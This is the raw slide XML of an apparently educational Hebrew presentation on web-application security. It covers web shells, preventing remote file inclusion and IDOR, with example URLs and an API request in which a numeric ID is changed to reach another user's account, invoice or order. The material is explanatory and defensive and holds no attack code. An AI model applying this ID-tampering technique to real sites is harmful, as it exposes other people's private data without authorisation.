              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני לשרת, המכיל קוד שמאפשר לתוקף לשלוט מרחוק בשרת. זה כולל הפעלת פקודות, העלאת קבצים, והוספת משתמשים חדשים. קובץ כזה נקרא</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Web ,Shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והוא יכול לשמש את התוקף כדי לשמור על גישה לשרת גם לאחר סיום ההתקפה הראשונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כדי למנוע מתקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יש לוודא שהאפליקציה טוענת רק קבצים מקומיים מתוך ספריות מוגדרות מראש ולא מקבלת קלט בלתי מסונן מהמשתמש. אפשר גם להשבית פונקציות ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>allow_url_include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> להשתמש במסלולים יחסיים במקום נתיבים מלאים, ולבדוק את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הקלטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של המשתמשים כדי לוודא שהם לא מכילים נתיבים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="49271078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96FCB214-A714-454C-BD66-506153284CC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1136374" y="2610015"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="4400" dirty="0"/>
              <a:t>Insecure Direct Object Reference (IDOR)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="356512105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30C864-9E66-4068-854C-281A1C2FB55B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962438" y="632655"/>
            <a:ext cx="10267123" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>Insecure Direct Object Reference (IDOR)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{680172F5-9D1D-4AD0-8A71-A0695E73BA54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2453971"/>
            <a:ext cx="10058400" cy="2041497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Insecure Direct Object Reference (IDOR)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא סוג של פגיעות אבטחת מידע שבה התוקף יכול לגשת ישירות לאובייקט (כגון קובץ, רשומה במסד נתונים, או פריט אחר) על ידי שינוי מזהה האובייקט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. הדבר מתאפשר כאשר האפליקציה לא מוודאת אם למשתמש יש את ההרשאות המתאימות לגשת לאובייקט המסוים הזה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="139580784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D87281E-0DD8-4362-9892-0667CDCC52A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7275442" y="642594"/>
            <a:ext cx="3849757" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5119DF29-B23B-46BF-A289-55C4CA43116B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> עובד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לך אתר לניהול חשבונות משתמשים, וכל משתמש יכול לגשת לחשבון שלו על ידי כניסה עם שם משתמש וסיסמה. לאחר הכניסה, המשתמש מועבר לדף שמציג את פרטי החשבון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>שלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נראה כך:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>://example.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>account?id=1234</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המספר "1234" הוא מזהה הלקוח </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Customer ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, אם האתר לא מוודא שהמשתמש שמחובר אכן מורשה לצפות בחשבון עם מזהה "1234", תוקף יכול פשוט לשנות את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ל-"1235" כדי לנסות לגשת לחשבון של משתמש אחר:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://example.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>account?id=1235</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם האפליקציה לא מוודאת את ההרשאות, התוקף יוכל לגשת לחשבון של המשתמש עם מזהה "1235" ולראות את המידע הפרטי שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="899977504"/>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AF33C30-D112-4FCB-8E84-C55E8B27F073}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7225748" y="642594"/>
            <a:ext cx="3899452" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA98E482-F7A6-4B59-9572-075B973FB331}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה מהעולם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>האמיתי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חברה בינלאומית גדולה ניהלה פורטל אינטרנט ללקוחות שלה. אחד מהמתכנתים בנה פונקציה שמאפשרת ללקוחות להוריד קבצים של חשבוניות ישירות מהאתר. כל לקוח קיבל קישור ייחודי להורדת הקובץ, שנראה כך:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://example.com/download?file=invoice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>.pdf</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יום אחד, אחד הלקוחות גילה שהוא יכול לשנות את שם הקובץ בקישור ל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://example.com/download?file=invoice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>124</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>.pdf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ובכך הוריד חשבונית של לקוח אחר. החברה לא הגנה על הפונקציה כדי לוודא שרק המשתמש המתאים יכול להוריד את הקובץ שלו. פגיעות זו חשפה את כל המידע הפיננסי של הלקוחות האחרים והובילה לנזק עצום לחברה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="228876835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60E380D-25DF-4994-A527-EAC72451AFFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6480313" y="642594"/>
            <a:ext cx="4644886" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד למנוע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D1D7CA2-F4E7-43A4-95F6-052FE70D672B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>לוודא את הרשאות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תמיד יש לוודא שלמשתמש יש את ההרשאות הנדרשות לגשת לאובייקט מסוים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הצפנה של מזהים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש במזהים מוצפנים או סודיים במקום מזהים רציפים שקל לנחש אותם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעת גישה ישירה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במקום לאפשר גישה ישירה לאובייקטים לפי מזהים, ניתן ליצור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמטפל בבקשות ומוודא הרשאות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="375109624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16AC0C0-4929-45BB-BC17-4D7A7480B0C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4999382" y="642594"/>
            <a:ext cx="6125817" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>APIs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0312C171-4B62-4A45-AB3B-55697D462F86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בפיתוח יישומים מודרניים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> APIs (Application Programming Interfaces)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הם מרכיב חשוב מאוד, ורבים מהם פגיעים ל- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. במקרים רבים, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> APIs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חושפים נקודות קצה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> endpoints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמאפשרות גישה לאובייקטים על סמך מזהים. אם ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לא מוודא שהמזהה שייך למשתמש שמבצע את הבקשה, התוקף יכול לשלוח בקשות עם מזהים אחרים ולקבל גישה לאובייקטים שהוא לא אמור לראות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>[מהו בעצם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>? הוא ממשק תכנות יישומים שמאפשר לתוכנות שונות לתקשר אחת עם השנייה. ניתן לדמיין את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמתווך שמקשר בין שתי תוכנות ומאפשר להן להחליף מידע בצורה מסודרת ומאובטחת.]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נניח שיש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמאפשר למשתמשים לקבל מידע על ההזמנות שלהם עם הבקשה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/orders/1234</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם המשתמש מחובר אך ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לא בודק שההזמנה עם מזהה "1234" שייכת לאותו משתמש, התוקף יכול לשנות את המזהה ל-"1235" ולקבל גישה לפרטי ההזמנה של משתמש אחר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2399683544"/>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D6DF28C-02D7-4365-AC6C-2694830F65D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1789042" y="642594"/>
            <a:ext cx="9336157" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם קשרי גומלין במערכות מורכבות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6D6C393-7C7C-4428-B39E-A7738F68459F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר מערכת מכילה מספר טבלאות או ישויות במאגר נתונים עם קשרי גומלין (כמו טבלת משתמשים וטבלת הזמנות), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול להתרחש אם המערכת מאפשרת גישה לא ישירה לאובייקטים שמקושרים אחד לשני ללא בדיקת הרשאות מלאה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נניח שיש מערכת ניהול עובדים שבה ניתן לעובדים גישה לפרופיל שלהם ולדוחות עבודה. אם דוח העבודה מקושר למזהה העובד אך אין בדיקה שמוודאת שהדוח אכן שייך לעובד המחובר, התוקף יכול לשנות את מזהה הדוח ולהוריד דוחות של עובדים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Facebook Bug Bounty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפייסבוק</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התגלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>שאיפשר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> למשתמשים לצפות בתמונות פרטיות של משתמשים אחרים על ידי שינוי מזהה התמונה ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
